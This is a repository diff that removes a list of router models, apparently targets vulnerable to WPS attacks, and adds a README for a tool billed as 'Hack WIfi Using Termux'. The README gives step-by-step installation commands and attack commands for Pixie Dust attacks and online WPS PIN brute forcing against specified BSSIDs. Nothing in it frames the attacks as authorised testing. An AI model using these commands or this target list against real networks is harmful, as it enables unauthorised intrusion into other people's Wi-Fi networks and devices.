@@ -1,141 +1,34 @@
-ADSL RT2860
-AIR3G WSC Wireless Access Point AIR3G WSC Device
-AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP
-Archer_A9 1.0
-Archer A2 5.0
-Archer A5 4.0
-Archer C2 1.0
-Archer C2 3.0
-Archer C5 4.0
-Archer C6U 1.0.0
-Archer C20 1.0
-Archer C20 4.0
-Archer C20 5.0
-Archer C50 1.0
-Archer C50 3.0
-Archer C50 4.0
-Archer C50 5.0
-Archer C50 6.0
-Archer MR200 1.0
-Archer MR200 4.0
-Archer MR200 5.0
-Archer VR300 1.20
-Archer VR400 3.0
-B-LINK 123456
-Belkin AP EV-2012-09-01
-DAP-1360 DAP-1360
-DIR-819 v1.0.1
-DIR-842 DIR-842
-DWR-921C3 WBR-0001
-D-Link N Router GO-RT-N150
-D-Link Router DIR-605L
-D-Link Router DIR-615H1
-D-Link Router DIR-655
-D-Link Router DIR-809
-EC120-F5 1.0
-EV-2009-02-06
-Enhanced Wireless Router F6D4230-4 v1
-Home Internet Center KEENETIC series
-Home Internet Center Keenetic series
-Huawei Wireless Access Point RT2860
-JWNR2000v2(Wireless AP) JWNR2000v2
-Keenetic Keenetic series
-Linksys Wireless Access Point EA7500
-Linksys Wireless Router WRT110
-NBG-419N NBG-419N
-Netgear AP EV-2012-08-04
-NETGEAR Wireless Access Point R6220
-NETGEAR Wireless Access Point R6260
-N/A EV-2010-09-20
-Ralink Wireless Access Point RT2860
-Ralink Wireless Access Point WR-AC1210
-RTL8196E
-RTL8xxx EV-2009-02-06
-RTL8xxx EV-2010-09-20
-RTL8xxx RTK_ECOS
-RT-G32 1234
-Sitecom Wireless Router 300N X2 300N
-Smart Router R3 RT2860
-Tenda 123456
-Timo RA300R4 Timo RA300R4
-TD-W8151N RT2860
-TD-W8901N RT2860
-TD-W8951ND RT2860
-TD-W9960 1.0
-TD-W9960 1.20
-TD-W9960v 1.0
-TD-W8968 2.0
-TL-MR3020 3.0
-TL-MR3420 5.0
-TL-MR6400 3.0
-TL-MR6400 4.0
-TL-WA855RE 4.0
-TL-WR840N 4.0
-TL-WR840N 5.0
-TL-WR840N 6.0
-TL-WR841N 13.0
-TL-WR841N 14.0
-TL-WR841HP 5.0
-TL-WR842N 5.0
-TL-WR845N 3.0
-TL-WR845N 4.0
-TL-WR850N 1.0
-TL-WR850N 2.0
-TL-WR850N 3.0
-TL-WR1042N EV-2010-09-20
-Trendnet router TEW-625br
-Trendnet router TEW-651br
-VMG3312-T20A RT2860
-VMG8623-T50A RT2860
-WAP300N WAP300N
-WAP3205 WAP3205
-Wi-Fi Protected Setup Router RT-AC1200G+
-Wi-Fi Protected Setup Router RT-N10U
-Wi-Fi Protected Setup Router RT-N12
-Wi-Fi Protected Setup Router RT-N12D1
-Wi-Fi Protected Setup Router RT-N12VP
-Wireless Access Point .
-Wireless Router 123456
-Wireless Router RTL8xxx EV-2009-02-06
-Wireless WPS Router <#ZVMODELVZ#>
-Wireless WPS Router RT-N10E
-Wireless WPS Router RT-N10LX
-Wireless WPS Router RT-N12E
-Wireless WPS Router RT-N12LX
-WN3000RP V3
-WN-200R WN-200R
-WPS Router (5G) RT-N65U
-WPS Router DSL-AC51
-WPS Router DSL-AC52U
-WPS Router DSL-AC55U
-WPS Router DSL-N14U-B1
-WPS Router DSL-N16
-WPS Router DSL-N17U
-WPS Router RT-AC750
-WPS Router RT-AC1200
-WPS Router RT-AC1200_V2
-WPS Router RT-AC1750
-WPS Router RT-AC750L
-WPS Router RT-AC1750U
-WPS Router RT-AC51
-WPS Router RT-AC51U
-WPS Router RT-AC52U
-WPS Router RT-AC52U_B1
-WPS Router RT-AC53
-WPS Router RT-AC57U
-WPS Router RT-AC65P
-WPS Router RT-AC85P
-WPS Router RT-N11P
-WPS Router RT-N12E
-WPS Router RT-N12E_B1
-WPS Router RT-N12 VP
-WPS Router RT-N12+
-WPS Router RT-N14U
-WPS Router RT-N56U
-WPS Router RT-N56UB1
-WPS Router RT-N65U
-WPS Router RT-N300
-ZyXEL NBG-416N AP Router
-ZyXEL NBG-418N AP Router
-ZyXEL NBG-418N AP Router NBG-418N
-ZyXEL Wireless AP Router NBG-417N
+## ssjoy
+### Hack WIfi Using Termux! (Requires Root)
+
+<p align="center"><img src="https://i.ibb.co/K74g0SC/hulu.jpg"></p>
+
+### Installation :
+
+```bash
+$ apt update && apt upgrade
+$ apt install -y root-repo
+$ apt install -y git tsu python wpa-supplicant pixiewps iw
+$ git clone https://github.com/Joy43/wifi_joy.git
+$ cd ssjoy
+$ chmod +x joy.py
+$ sudo python joy.py --help
+```
+* Run joy.py with python3
+    * On kali linux
+        ```bash
+        python3 joy.py -i wlan0 -K
+        ```
+
+#### Example : `python3 joy.py -i wlan0 -K`
+
+#### Note: 
+**First turn off your Wifi.**
+- Show avaliable networks and start Pixie Dust attack on a specified network.
+- `sudo python joy.py -i wlan0 -K`
+- - Start Pixie Dust attack on a specified BSSID:
+`sudo python joy.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
+- Launch online WPS bruteforce with the specified first half of the PIN:
+- `sudo python joy.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
+### Troubleshooting
+**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
